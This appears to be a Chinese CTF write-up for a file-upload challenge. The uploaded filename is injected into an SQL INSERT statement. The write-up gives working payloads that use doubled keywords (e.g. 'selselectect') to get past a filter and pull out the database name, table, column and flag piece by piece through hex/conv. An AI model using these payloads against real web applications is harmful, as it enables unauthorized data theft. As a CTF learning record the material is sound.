## 题目描述

无

## 思路

打开题目，是一个注册登录页面，可能有人会想到注入或者绕过等逻辑漏洞，可惜都不是。

![20190830222800.png](https://raw.githubusercontent.com/handbye/images/master/20190830222800.png)

那就注册一个用户登录试试吧。

![20190830223001.png](https://raw.githubusercontent.com/handbye/images/master/20190830223001.png)

是一个文件上传页面，先上传一个文件试试。

![20190830223207.png](https://raw.githubusercontent.com/handbye/images/master/20190830223207.png)

图片可以正常上传，并显示到了页面中。

![20190830223253.png](https://raw.githubusercontent.com/handbye/images/master/20190830223253.png)

上传php脚本，提示文件扩展不正确，看来是对文件后缀做了过滤的，经过测试只能上传jpg后缀的文件，看来是白名单过滤。

值得注意的是我们上传的文件名都会显示到页面上，这个过程可能是经过数据库查询的。意思是我们上传的文件名会存放到数据库中，猜测插入语句为：

```sql
insert into 表名('filename',...) values('你上传的文件名',...);
```

这里的`filename`是可控的，我们只有尝试构造filename进行注入。

需注意的是，系统将select、from等关键字都进行了过滤。

![20190830224921.png](https://raw.githubusercontent.com/handbye/images/master/20190830224921.png)

考虑双写绕过：

![20190830225014.png](https://raw.githubusercontent.com/handbye/images/master/20190830225014.png)

- 采用`sselectelect database()`进行注入，发现页面返回0
- 采用`selecselectt substr(dAtabase(),1,12)`进行注入，页面依旧返回0
- 采用`selecselectt substr(hex(dAtabase()),1,12))`进行注入，页面返回7765625，本应返回7765625f7570，但遇到’f‘导致截断，所以需要conv转成十进制输出

> substr需要进行长度限制：不限制长度会导致返回值太大，系统使用科学计数法（xx e xxxxx）表示。

至于上面那个为啥遇到f会导致截断，以及为什么会想到将16进制转为10禁止输出，我也没相通，哪位大佬知道还希望指导下。

基于上面的原因，我们需要构造下面这句话来进行注入：

```sql
文件名'+(selselectect conv(substr(hex(database()),1,12),16,10))+'.jpg
```

拼接后的sql语句为：

```sql
...values('文件名'+(selselectect conv(substr(hex(database()),1,12),16,10))+'.jpg',...);
```

> CONV(n,from_radix,to_radix)：用于将n从from_radix进制转到to_radix进制
>substr(str,start,length)：将str从start长度为length分割
>hex(str)：将str转成十六进制

知道了注入语句，接下来就开始进行注入操作：

```sql
1. 注入库名：
file_name' +(selselectect conv(substr(hex(database()),1,12),16,10))+ '.jpg
# 得到数字 131277325825392 转换为16进制为 7765625f7570 转换为文字为 web_up
file_name' +(selselectect conv(substr(hex(database()),13,12),16,10))+ '.jpg
# 得到数字 1819238756 转换为16禁止为 6c6f6164 转换为文字为 load
# 下面的注入方式类似，不在细述
2. 注入表名：
file_name'+(seleselectct+conv(substr(hex((selselectect table_name frfromom information_schema.tables where table_schema = 'web_upload' limit 1,1)),1,12),16,10))+'.jpg
# 得到表名 hello_flag_is_here
3. 注入字段：
file_name'+(seleselectct+conv(substr(hex((selselectect COLUMN_NAME frfromom information_schema.COLUMNS where TABLE_NAME = 'hello_flag_is_here' limit 1,1)),1,12),16,10))+'.jpg
# 得到字段 i_am_flag
4. 获取数据：
file_name'+(seleselectct+CONV(substr(hex((seselectlect i_am_flag frfromom hello_flag_is_here limit 0,1)),13,12),16,10))+'.jpg
#得到Flag: !!_@m_Th.e_F!lag
```
